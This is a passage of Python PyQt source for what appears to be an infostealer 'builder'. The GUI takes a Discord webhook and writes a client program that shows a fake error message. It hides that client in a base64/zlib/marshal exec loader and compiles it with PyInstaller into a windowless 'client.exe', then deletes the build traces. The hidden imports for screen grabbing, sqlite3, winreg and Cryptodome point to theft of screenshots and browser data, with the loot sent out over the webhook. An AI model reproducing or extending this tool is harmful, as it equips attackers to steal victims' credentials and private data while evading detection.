            QPushButton:hover { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4f46e5, stop:1 #7c3aed); }
            QPushButton:pressed { background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4338ca, stop:1 #6d28d9); }
            QPushButton:disabled { background-color: #27272a; color: #52525b; }
        ''')
        self.compile_btn.clicked.connect(self.compile)
        
        bot_layout.addWidget(self.webhook_input)
        bot_layout.addSpacing(10)
        bot_layout.addWidget(self.test_btn)
        bot_layout.addSpacing(15)
        bot_layout.addWidget(self.compile_btn)
        
        layout.addWidget(bot_bar)
        
        self._compiling = False
        self.test_done_signal.connect(self._test_done)
        self.compile_done_signal.connect(self._compile_done)

    def _normalize_webhook(self, raw: str) -> str:
        raw = raw.strip()
        m = re.match(
            r"^https?://(?:discord(?:app)?\.com)/api/webhooks/(\d+)/([\w-]+)",
            raw, re.I,
        )
        if not m:
            return ""
        return f"https://discord.com/api/webhooks/{m.group(1)}/{m.group(2)}"

    def test_webhook(self):
        url = self._normalize_webhook(self.webhook_input.text())
        if not url:
            return

        self.test_btn.setEnabled(False)
        self.test_btn.setText("…")

        def work():
            try:
                r = requests.post(url, json={"content": "@everyone webhook is working"}, timeout=15)
                ok = r.status_code in (200, 204)
            except Exception:
                ok = False
            self.test_done_signal.emit(ok)

        threading.Thread(target=work, daemon=True).start()

    def _test_done(self, ok: bool):
        self.test_btn.setEnabled(True)
        self.test_btn.setText("Test")
        if not ok:
            QMessageBox.warning(self, "Test Failed", "Webhook test failed.")

    def compile(self):
        if self._compiling:
            return

        url = self._normalize_webhook(self.webhook_input.text())
        if not url:
            QMessageBox.warning(self, "Error", "Invalid webhook URL.")
            return

        self._compiling = True
        self.compile_btn.setEnabled(False)
        self.compile_btn.setText("Compiling…")

        opts = {"webhook": url}
        for k, v in OPTION_KEYS.items():
            opts[v] = self.toggles[k].isChecked()
        opts["fake_error_title"] = self.fake_error_title.text().strip() or "Application Error"
        opts["fake_error_message"] = self.fake_error_message.toPlainText().strip() or (
            "The application was unable to start correctly (0xc000007b)."
        )
        opts["mb_spoofer_size"] = _parse_mb_size(self.mb_spoofer_size.text())

        threading.Thread(target=self._compile_worker, args=(opts,), daemon=True).start()

    def _compile_worker(self, opts: dict):
        try:
            webhook = opts.pop("webhook")
            write_client_source(CLIENT_SRC, webhook, **opts)

            import base64, marshal, zlib
            obf_src = BUILD_DIR / "client_obf.py"
            
            try:
                src = CLIENT_SRC.read_text(encoding="utf-8")
                code_obj = compile(src, str(CLIENT_SRC), "exec")
                data = marshal.dumps(code_obj)
                data = zlib.compress(data)
                b64 = base64.b64encode(data).decode("ascii")
                loader = f"import base64 as b, marshal as m, zlib as z;a={repr(b64)};b=b.b64decode(a);b=z.decompress(b);c=m.loads(b);exec(c)"
                obf_src.write_text(loader, encoding="utf-8")
                src_to_compile = obf_src
            except Exception as e:
                self.compile_done_signal.emit(False, f"Obfuscation failed:\n{str(e)}")
                return

            ok, msg = self._run_pyinstaller(src_to_compile)
            if ok:
                self._cleanup_build_artifacts()
            self.compile_done_signal.emit(ok, msg)
        except Exception as exc:
            self.compile_done_signal.emit(False, str(exc))

    def _compile_done(self, ok: bool, msg: str):
        self._compiling = False
        self.compile_btn.setEnabled(True)
        self.compile_btn.setText("Build Payload")
        if not ok and msg:
            QMessageBox.critical(self, "Builder Error", msg)
        elif ok:
            QMessageBox.information(self, "Builder Success", f"Success! Saved to {msg}")

    def _finalize_exe(self, built: Path, missing_msg: str) -> tuple[bool, str]:
        if not built.exists():
            return False, missing_msg
        if OUTPUT_EXE.exists():
            OUTPUT_EXE.unlink()
        shutil.move(str(built), str(OUTPUT_EXE))
        return True, str(OUTPUT_EXE)

    def _cleanup_build_artifacts(self):
        remove_dirs = [BUILD_DIR / "dist", BUILD_DIR / "work"]
        remove_files = [BUILD_DIR / "client.spec", BUILD_DIR / "client_obf.py"]

        for path in remove_dirs:
            try:
                if path.is_dir():
                    shutil.rmtree(path, ignore_errors=True)
            except Exception:
                pass

        for path in remove_files:
            try:
                path.unlink(missing_ok=True)
            except Exception:
                pass

        try:
            CLIENT_SRC.unlink(missing_ok=True)
        except Exception:
            pass

        if BUILD_DIR.exists():
            for cache in BUILD_DIR.rglob("__pycache__"):
                try:
                    shutil.rmtree(cache, ignore_errors=True)
                except Exception:
                    pass
            try:
                if BUILD_DIR.exists() and not any(BUILD_DIR.iterdir()):
                    BUILD_DIR.rmdir()
            except Exception:
                pass

    def _run_pyinstaller(self, src_file: Path) -> tuple[bool, str]:
        dist = BUILD_DIR / "dist"
        work = BUILD_DIR / "work"
        for p in (dist, work):
            p.mkdir(parents=True, exist_ok=True)

        args = [
            PYTHON_EXE, "-m", "PyInstaller",
            "--onefile", "--noconsole", "--clean",
            "--name", "client",
            f"--distpath={dist}",
            f"--workpath={work}",
            f"--specpath={BUILD_DIR}",
            "--hidden-import=PIL.ImageGrab",
            "--hidden-import=requests",
            "--hidden-import=sqlite3",
            "--hidden-import=winreg",
            "--hidden-import=Cryptodome.Cipher",
            "--collect-submodules=Cryptodome",
            str(src_file),
        ]

        proc = subprocess.run(args, capture_output=True, text=True, cwd=str(APP_DIR))
        if proc.returncode != 0:
            tail = (proc.stderr or proc.stdout or "")[-2000:]
            return False, f"PyInstaller failed:\n{tail}"

        return self._finalize_exe(dist / "client.exe", "Build finished but client.exe was not found.")

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    splash = LoadingScreen()
    splash.show()
    
    global builder_window
    
    def on_ready():
        global builder_window
        builder_window = BuilderApp()
        builder_window.show()
        splash.hide()
        
    splash.checker.finished_check.connect(on_ready)
    
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
